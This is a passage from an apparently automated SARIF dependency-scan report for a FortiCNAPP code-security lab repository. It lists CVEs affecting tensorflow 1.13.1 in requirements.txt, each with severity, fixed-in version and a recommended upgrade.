              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15207",
          "ruleIndex": 61,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15207 (severity: medium, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15207](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15207)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "46fb3a674393c58282fcf0c08aa22e71c1281308"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15205",
          "ruleIndex": 62,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15205 (severity: medium, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15205](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15205)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "cf330f45bfe49824beb7b9c3ddc327b881f260df"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15195",
          "ruleIndex": 63,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15195 (severity: medium, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15195)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "29f002a432679440000d2f4dcf459a3e361da758"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15206",
          "ruleIndex": 64,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15206 (severity: high, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15206](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15206)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "6dea20816cc0fe3b6c4892f03206548b0bd92436"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15203",
          "ruleIndex": 65,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15203 (severity: high, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15203)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e77775c6b7e6d1ae342bd1e81fc9d31f5c93753f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15211",
          "ruleIndex": 66,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15211 (severity: medium, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15211](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15211)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "58b950e3e089f27409dcdfb8864eeee51367d55d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15210",
          "ruleIndex": 67,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15210 (severity: high, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15210](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15210)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9915e01b9bb33c59292d948ce59bbf2a36cbe52f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15204",
          "ruleIndex": 68,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15204 (severity: medium, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15204)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3eb717d7594cedeb5fb0a07f5c2cae882b9f3f69"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15208",
          "ruleIndex": 69,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15208 (severity: high, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15208](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15208)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "63044f5982c3e5e7c93e44cec4244087b1156ba7"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-26267",
          "ruleIndex": 70,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-26267 (severity: low, fixed in 1.15.5)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-26267](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26267)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "54bbf7ca9f5785d18fd398851f801c8438d3de76"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-26266",
          "ruleIndex": 71,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-26266 (severity: medium, fixed in 1.15.5)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-26266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26266)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7212afb27ea1b02c34aa2af52d4651acd18e72f8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-26270",
          "ruleIndex": 72,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-26270 (severity: medium, fixed in 1.15.5)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-26270](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26270)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "4a9ba8fde015ee68c0c35dc26ad23e974b71f4a2"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-26271",
          "ruleIndex": 73,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-26271 (severity: medium, fixed in 1.15.5)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-26271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26271)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "cc0cb3957eece8f451c3912986e3d4d1822ffbbc"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-26268",
          "ruleIndex": 74,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-26268 (severity: medium, fixed in 1.15.5)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-26268](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26268)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7831e7e265cae43690c9d1cb903f661bc09cf303"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29597",
          "ruleIndex": 75,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29597 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29597](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29597)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "131d945433663adbdb46735d7f0d39760f8c0566"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29532",
          "ruleIndex": 76,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29532 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29532](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29532)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f8eff763a0c23c2a51c8eb5e1700462a3a4e61bb"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29527",
          "ruleIndex": 77,
          "level": "note",
          "message": {
